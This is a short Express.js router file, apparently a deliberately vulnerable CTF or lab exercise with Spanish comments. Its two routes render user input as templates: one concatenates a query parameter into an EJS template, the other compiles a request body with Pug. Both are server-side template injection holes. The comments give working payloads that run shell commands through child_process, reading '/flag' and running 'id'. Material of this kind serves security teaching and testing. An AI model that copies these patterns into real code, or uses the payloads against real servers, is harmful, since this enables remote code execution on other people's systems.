const express = require('express');
const ejs = require('ejs');
const pug = require('pug');
const router = express.Router();

// Vuln 1: EJS renderiza un string armado con input del usuario
router.get('/hello', (req, res) => {
    res.send(ejs.render('<h1>Hola ' + req.query.name + '</h1>'));
    // name = <%= process.mainModule.require('child_process').execSync('cat /flag') %>
});

// Vuln 2: Pug compila la plantilla del usuario
router.post('/card', (req, res) => {
    res.send(pug.render(req.body.template, { user: req.session.user }));
    // template = #{global.process.mainModule.require('child_process').execSync('id')}
});

module.exports = router;
